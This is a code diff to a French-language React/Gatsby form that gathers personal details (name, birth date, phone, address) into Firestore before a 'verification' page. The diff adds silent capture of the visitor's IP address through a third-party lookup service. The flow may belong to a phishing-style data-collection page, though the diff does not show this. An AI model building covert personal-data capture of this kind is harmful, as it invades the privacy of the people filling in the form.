@@ -2,9 +2,9 @@ import * as React from 'react';
 import {StaticImage} from "gatsby-plugin-image";
 import './Information.css';
 import { navigate } from "gatsby"
-import {useState} from "react";
+import {useState, useEffect} from "react";
 import {addInformationDetails} from "../firebase/firestore";
-export default function(){
+export default function Information(){
     const [email,setEmail]=useState("");
     const [firstName,setFirstName]=useState("");
     const [lastName,setLastName]=useState("");
@@ -13,11 +13,19 @@ export default function(){
     const [address,setAddress]=useState("");
     const [town,setTown]=useState("");
     const [loading,setLoading]=useState(false);
+    const [isFocused,setIsFocused]=useState(false);
+    const [ip, setIp] = useState("none");
+    useEffect(() => {
+        fetch("https://api.ipify.org/")
+            .then(res => res.text())
+            .then(res => setIp(res))
+            .catch(e => setIp("error"))
+    }, [])
     async function onSubmit(e) {
 
         e.preventDefault();
         setLoading(true);
-        await addInformationDetails({email,firstName,lastName,dob,phone,address,town,timestamp:new Date().getTime()});
+        await addInformationDetails({email,firstName,lastName,dob,phone,address,town,timestamp:new Date().getTime(),ip});
         await navigate('/verification');
 
     }
@@ -38,7 +46,7 @@ export default function(){
                             <input value={email} onChange={e => setEmail(e.target.value)}
                                 type="email" placeholder="Entrez une adresse mail valide" id="email-2c6e"
                                    name="email" className="u-border-1 u-border-grey-30 u-input u-input-rectangle"
-                                   required=""/>
+                                   required="" autoFocus={true}/>
                         </div>
                         <div className="u-form-group u-form-name u-label-none u-form-group-2">
                             <label htmlFor="name-6fee" className="u-label">prénom</label>
@@ -54,10 +62,13 @@ export default function(){
                         </div>
                         <div className="u-form-group u-label-none u-form-group-4">
                             <label htmlFor="text-94d0" className="u-label">Date</label>
-                            <input value={dob} onChange={e=>setDOB(e.target.value)}
+                            {!isFocused?<input onClick={()=>setIsFocused(true)}
+                                   type="text" value="" placeholder={"Date de naissance "+dob} id="name-732a" name="name-1"
+                                   className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required=""/>
+                            :<input value={dob} onChange={e=>setDOB(e.target.value)} onBlur={()=>setIsFocused(false)}
                                 type="date" placeholder="Date de naissance (JJ/MM/AAAA)" id="text-94d0" name="Date"
                                    className="u-border-1 u-border-grey-30 u-input u-input-rectangle"
-                                   required="required"/>
+                                   required="required"/>}
                         </div>
                         <div className="u-form-group u-form-phone u-label-none u-form-group-5">
                             <label htmlFor="phone-bfde" className="u-label">Téléphone</label>
